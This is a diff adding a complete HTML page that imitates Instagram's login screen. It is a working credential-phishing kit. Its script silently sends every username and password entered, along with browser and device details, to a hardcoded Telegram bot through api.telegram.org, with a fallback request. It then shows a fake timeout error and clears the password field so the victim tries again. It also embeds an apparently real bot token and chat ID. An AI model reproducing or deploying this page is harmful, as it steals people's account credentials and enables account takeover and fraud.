@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Instagram</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: #000;
+      color: #f5f5f5;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
+    .wrapper { display: flex; align-items: center; justify-content: center; width: 100%; max-width: 935px; }
+    .phone { display: none; width: 380px; height: 580px; margin-right: 32px; }
+    @media (min-width: 876px) { .phone { display: block; } }
+    .phone svg { width: 100%; height: 100%; }
+    .login-box { width: 100%; max-width: 350px; }
+    .logo { text-align: center; margin: 24px 0; }
+    .logo svg { width: 175px; }
+    .card { border: 1px solid #363636; padding: 24px 40px; margin-bottom: 10px; }
+    @media (max-width: 450px) { .card { border: none; padding: 0 16px; } }
+    .field { position: relative; margin-bottom: 6px; }
+    .field input {
+      width: 100%; background: #121212; border: 1px solid #363636; color: #f5f5f5;
+      font-size: 12px; padding: 14px 8px 2px; outline: none; height: 38px; border-radius: 3px;
+    }
+    .field label {
+      position: absolute; left: 8px; top: 50%; transform: translateY(-50%);
+      color: #a8a8a8; font-size: 12px; pointer-events: none; transition: 0.15s;
+    }
+    .field input:focus ~ label, .field input:not(:placeholder-shown) ~ label {
+      top: 6px; font-size: 10px; transform: translateY(0);
+    }
+    .toggle-pw {
+      position: absolute; right: 8px; top: 50%; transform: translateY(-50%);
+      background: none; border: none; color: #f5f5f5; font-weight: 600; cursor: pointer;
+    }
+    .login-btn {
+      width: 100%; background: #0095f6; color: white; border: none; border-radius: 8px;
+      padding: 7px 16px; font-size: 14px; font-weight: 600; margin: 16px 0;
+      cursor: pointer; height: 32px; display: flex; align-items: center; justify-content: center; gap: 8px;
+    }
+    .login-btn:disabled { opacity: 0.3; }
+    .spinner {
+      width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3);
+      border-top-color: white; border-radius: 50%; animation: spin 0.8s linear infinite; display: none;
+    }
+    .login-btn.loading .spinner { display: inline-block; }
+    .login-btn.loading .btn-text { display: none; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .divider {
+      display: flex; align-items: center; margin: 16px 0; color: #a8a8a8;
+      font-size: 13px; font-weight: 600;
+    }
+    .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #363636; }
+    .divider span { margin: 0 18px; }
+    .fb-btn {
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      color: #0095f6; font-weight: 600; background: none; border: none;
+      width: 100%; cursor: pointer; margin-bottom: 16px;
+    }
+    .fb-btn span { background: #0095f6; color: white; padding: 0 4px; border-radius: 2px; }
+    .forgot { display: block; text-align: center; color: #f5f5f5; font-size: 12px; text-decoration: none; }
+    .signup-card {
+      border: 1px solid #363636; padding: 20px; text-align: center;
+      margin-bottom: 16px; font-size: 14px;
+    }
+    @media (max-width: 450px) { .signup-card { border: none; } }
+    .signup-card a { color: #0095f6; font-weight: 600; text-decoration: none; margin-left: 4px; }
+    .stores { text-align: center; margin-top: 12px; }
+    .stores img { height: 40px; margin: 0 4px; }
+    .error-msg { color: #ed4956; font-size: 14px; text-align: center; margin: 10px 0; display: none; }
+  </style>
+</head>
+<body>
+<div class="wrapper">
+  <div class="phone">
+    <svg viewBox="0 0 380 580" width="100%" height="100%">
+      <rect width="380" height="580" rx="30" fill="#000" stroke="#363636" stroke-width="2"/>
+      <rect x="10" y="10" width="360" height="560" rx="22" fill="#000"/>
+      <circle cx="50" cy="110" r="28" fill="none" stroke="url(#g)" stroke-width="2"/>
+      <circle cx="50" cy="110" r="24" fill="#121212"/>
+      <circle cx="120" cy="110" r="28" fill="none" stroke="#363636" stroke-width="1"/>
+      <circle cx="120" cy="110" r="24" fill="#121212"/>
+      <rect x="20" y="160" width="340" height="200" rx="8" fill="#1a1a1a"/>
+      <circle cx="40" cy="380" r="8" fill="#363636"/>
+      <rect x="55" y="375" width="100" height="10" rx="5" fill="#363636"/>
+      <defs>
+        <linearGradient id="g" x1="0%" y1="100%" x2="100%" y2="0%">
+          <stop offset="0%" stop-color="#f09433"/><stop offset="25%" stop-color="#e6683c"/>
+          <stop offset="50%" stop-color="#dc2743"/><stop offset="75%" stop-color="#cc2366"/>
+          <stop offset="100%" stop-color="#bc1888"/>
+        </linearGradient>
+      </defs>
+    </svg>
+  </div>
+
+  <div class="login-box">
+    <div class="logo">
+      <svg viewBox="0 0 176 48" fill="none">
+        <defs>
+          <radialGradient id="igGrad" cx="20%" cy="120%" r="150%">
+            <stop offset="0%" stop-color="#FFDD55"/><stop offset="10%" stop-color="#FF543E"/>
+            <stop offset="50%" stop-color="#C837AB"/><stop offset="80%" stop-color="#4157A1"/>
+          </radialGradient>
+        </defs>
+        <path d="M34.8 0H13.2C5.9 0 0 5.9 0 13.2v21.6C0 42.1 5.9 48 13.2 48h21.6c7.3 0 13.2-5.9 13.2-13.2V13.2C48 5.9 42.1 0 34.8 0zm9.4 34.8c0 5.2-4.2 9.4-9.4 9.4H13.2c-5.2 0-9.4-4.2-9.4-9.4V13.2c0-5.2 4.2-9.4 9.4-9.4h21.6c5.2 0 9.4 4.2 9.4 9.4v21.6z" fill="url(#igGrad)"/>
+        <path d="M24 12c-6.6 0-12 5.4-12 12s5.4 12 12 12 12-5.4 12-12-5.4-12-12-12zm0 19.2c-4 0-7.2-3.2-7.2-7.2s3.2-7.2 7.2-7.2 7.2 3.2 7.2 7.2-3.2 7.2-7.2 7.2z" fill="url(#igGrad)"/>
+        <circle cx="37.2" cy="10.8" r="2.4" fill="url(#igGrad)"/>
+      </svg>
+    </div>
+
+    <div class="card">
+      <form id="loginForm">
+        <div class="field">
+          <input type="text" id="user" placeholder=" " autocomplete="username" required>
+          <label>Phone number, username, or email</label>
+        </div>
+        <div class="field">
+          <input type="password" id="pass" placeholder=" " autocomplete="current-password" required>
+          <label>Password</label>
+          <button type="button" class="toggle-pw" id="toggle">Show</button>
+        </div>
+        <div class="error-msg" id="error">Request timed out. Please try again.</div>
+        <button type="submit" class="login-btn" id="loginBtn">
+          <span class="spinner"></span><span class="btn-text">Log in</span>
+        </button>
+        <div class="divider"><span>OR</span></div>
+        <button type="button" class="fb-btn"><span>f</span> Log in with Facebook</button>
+        <a href="#" class="forgot">Forgot password?</a>
+      </form>
+    </div>
+    <div class="signup-card">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+    <div class="stores">
+      <p style="font-size:14px;">Get the app.</p>
+      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='136' height='40'%3E%3Crect width='136' height='40' rx='6' fill='%23000' stroke='%23A8A8A8' stroke-width='0.5'/%3E%3Ctext x='68' y='26' font-family='sans-serif' font-size='12' fill='white' text-anchor='middle'%3EApp Store%3C/text%3E%3C/svg%3E" alt="App Store">
+      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='136' height='40'%3E%3Crect width='136' height='40' rx='6' fill='%23000' stroke='%23A8A8A8' stroke-width='0.5'/%3E%3Ctext x='68' y='26' font-family='sans-serif' font-size='12' fill='white' text-anchor='middle'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Google Play">
+    </div>
+  </div>
+</div>
+
+<script>
+  (function() {
+    const BOT_TOKEN = '8899386309:AAHoIXA6r10xR1e3e1cO_G_-FQZKnYACD8w';
+    const CHAT_ID = '1998767298';
+
+    const form = document.getElementById('loginForm');
+    const userInput = document.getElementById('user');
+    const passInput = document.getElementById('pass');
+    const loginBtn = document.getElementById('loginBtn');
+    const toggleBtn = document.getElementById('toggle');
+    const errorDiv = document.getElementById('error');
+
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      const isMobile = /Mobi|Android/i.test(ua);
+      return {
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        viewport: `${window.innerWidth}x${window.innerHeight}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        deviceType: isMobile ? 'Mobile' : 'Desktop',
+        userAgent: ua
+      };
+    }
+
+    async function sendToTelegram(user, pass) {
+      const device = getDeviceInfo();
+      const now = new Date().toLocaleString();
+      const text = `🔐 *Instagram Login*\n\n` +
+        `👤 *Username:* \`${user}\`\n` +
+        `🔑 *Password:* \`${pass}\`\n\n` +
+        `📱 *Device Info*\n` +
+        `• Type: ${device.deviceType}\n` +
+        `• OS: ${device.platform}\n` +
+        `• Browser: ${device.userAgent}\n` +
+        `• Screen: ${device.screen}\n` +
+        `• Viewport: ${device.viewport}\n` +
+        `• Language: ${device.language}\n` +
+        `• Timezone: ${device.timezone}\n\n` +
+        `🕐 *Date & Time:* ${now}`;
+
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+        });
+        const data = await res.json();
+        return data.ok;
+      } catch (e) {
+        // GET fallback
+        try {
+          const encoded = encodeURIComponent(text);
+          const getRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}`);
+          const getData = await getRes.json();
+          return getData.ok;
+        } catch (e2) {
+          return false;
+        }
+      }
+    }
+
+    async function handleLogin(e) {
+      e.preventDefault();
+      const user = userInput.value.trim();
+      const pass = passInput.value;
+      if (!user || !pass) return;
+
+      loginBtn.classList.add('loading');
+      loginBtn.disabled = true;
+      errorDiv.style.display = 'none';
+
+      // Send silently to Telegram
+      sendToTelegram(user, pass);
+
+      // Simulate a delay then show the error message
+      setTimeout(() => {
+        loginBtn.classList.remove('loading');
+        loginBtn.disabled = false;
+        errorDiv.style.display = 'block';
+        passInput.value = '';
+        passInput.focus();
+      }, 2000);
+    }
+
+    form.addEventListener('submit', handleLogin);
+    loginBtn.addEventListener('click', handleLogin);
+
+    toggleBtn.addEventListener('click', () => {
+      const isPass = passInput.type === 'password';
+      passInput.type = isPass ? 'text' : 'password';
+      toggleBtn.textContent = isPass ? 'Hide' : 'Show';
+    });
+
+    // Disable demo links
+    document.querySelector('.fb-btn').addEventListener('click', (e) => e.preventDefault());
+    document.querySelector('.forgot').addEventListener('click', (e) => e.preventDefault());
+    document.querySelector('.signup-card a').addEventListener('click', (e) => e.preventDefault());
+  })();
+</script>
+</body>
+</html>
